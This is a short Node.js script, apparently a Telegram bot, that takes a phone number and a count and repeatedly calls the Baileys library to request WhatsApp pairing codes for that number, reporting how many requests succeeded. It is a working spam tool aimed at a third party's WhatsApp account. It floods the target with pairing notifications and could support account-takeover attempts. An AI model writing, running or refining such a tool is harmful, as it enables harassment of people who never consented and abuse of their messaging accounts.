const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const TelegramBot = require("node-telegram-bot-api");

const bot = new TelegramBot("BOT_TOKEN_LU", { polling: true });

bot.onText(/\/cp (\d+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const number = match[1];
    const jumlah = parseInt(match[2]);

    let successCount = 0;
    let failedCount = 0;
    let messageId = null;
    let pairingCodes = [];

    bot.sendMessage(chatId, `🔄 Processing pairing codes for ${number}...`).then(sentMsg => {
        messageId = sentMsg.message_id;
    });

    for (let i = 0; i < jumlah; i++) {
        try {
            const { state, saveCreds } = await useMultiFileAuthState("./session");
            const sock = makeWASocket({ auth: state });

            const pairingCode = await sock.requestPairingCode(number);
            pairingCodes.push(pairingCode);
            successCount++;

            const pairingText = pairingCodes.map((code, index) => `🔢 Pairing Code ${index + 1}: ${code}`).join("\n");

            bot.editMessageText(
                `🔄 Processing pairing codes for ${number}...\n\n${pairingText}`,
                { chat_id: chatId, message_id: messageId }
            );

        } catch (error) {
            failedCount++;
        }
    }

    bot.editMessageText(
        `💥 Successfully Sent 💥\n✅ Count Success: ${successCount}\n❌ Count Failed: ${failedCount}`,
        { chat_id: chatId, message_id: messageId }
    );
});
